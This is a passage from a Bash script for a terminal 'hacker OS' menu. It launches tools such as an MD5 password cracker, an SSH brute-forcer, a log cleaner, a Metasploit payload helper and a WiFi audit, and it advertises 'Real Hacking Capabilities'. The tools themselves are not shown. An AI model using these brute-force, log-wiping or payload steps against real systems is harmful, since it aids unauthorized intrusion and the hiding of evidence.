                3) create_window "Password Cracker" "$XCX_BIN/crackpass md5 5f4dcc3b5aa765d61d8327deb882cf99" 70 15 ;;
                4) create_window "Hash Tool" "$XCX_BIN/hashtool sha256 test" 60 10 ;;
                5) create_window "Web Scanner" "$XCX_BIN/webscan localhost" 70 20 ;;
                6) create_window "Packet Sniffer" "echo 'Run with sudo: sudo $XCX_BIN/sniffer'" 60 8 ;;
                7) create_window "DNS Tool" "$XCX_BIN/dnstool google.com" 60 10 ;;
                8) create_window "MAC Changer" "echo 'Usage: sudo $XCX_BIN/macchanger eth0'" 60 8 ;;
                9) create_window "SSH Brute" "$XCX_BIN/sshbrute localhost" 70 15 ;;
            esac
            ;;
            
        1[0-5])
            case "$key" in
                '10') create_window "Anonymous Surf" "$XCX_BIN/anonsurf status" 60 12 ;;
                '11') create_window "File Encryptor" "echo 'Usage: encrypt <encrypt|decrypt> <file> <password>'" 70 10 ;;
                '12') create_window "Log Cleaner" "$XCX_BIN/cleanlogs" 60 12 ;;
                '13') create_window "Keylogger Detector" "$XCX_BIN/detectkey" 60 15 ;;
                '14') create_window "WiFi Audit" "echo 'Run with sudo: sudo $XCX_BIN/wifiaudit --scan'" 70 12 ;;
                '15') create_window "MSF Helper" "echo 'Usage: msfhelper <payload> <lhost> <lport> <output>'" 80 15 ;;
            esac
            ;;
            
        # Letter shortcuts
        [tT]) create_window "Terminal" "bash" 80 25 ;;
        [xX]) # Close active window
            if [ -n "$ACTIVE_WIN" ]; then
                close_window $ACTIVE_WIN
                ACTIVE_WIN=""
            fi
            ;;
        [qQ]) cleanup ;;
    esac
}

# ============================================
# MAIN LOOP
# ============================================

draw_desktop() {
    clear
    draw_taskbar
    draw_apps_menu
    draw_system_monitor
    
    # Redraw all windows
    for id in "${!WINDOWS[@]}"; do
        draw_window_frame $id
    done
}

cleanup() {
    # Kill all child processes
    for pid in "${WIN_PID[@]}"; do
        kill -9 $pid 2>/dev/null
    done
    
    # Stop services
    sudo systemctl stop tor 2>/dev/null
    
    tput cnorm
    clear
    echo -e "${HACK[GREEN]}Goodbye from XCX MEGA TOP!${HACK[RESET]}"
    exit 0
}

# ============================================
# START SYSTEM
# ============================================

# Initialize
init_system

# Boot animation
clear
echo -e "${HACK[GREEN]}${HACK[BOLD]}"
echo "╔══════════════════════════════════════════════════╗"
echo "║     XCX MEGA TOP - FULL FUNCTIONAL HACKER OS    ║"
echo "║              Version 6.0.0 - REAL DEAL          ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${HACK[RESET]}"
sleep 1

# Create splash window
create_window "XCX MEGA TOP" "echo 'WELCOME TO XCX MEGA TOP\n\n15 Fully Functional Tools\nReal Hacking Capabilities\nAnonymous by Default\n\nPress F1 for Help\nPress any key to start...'" 60 15

# Wait for key
read -n1

# Main loop
while true; do
    draw_desktop
    handle_input
done
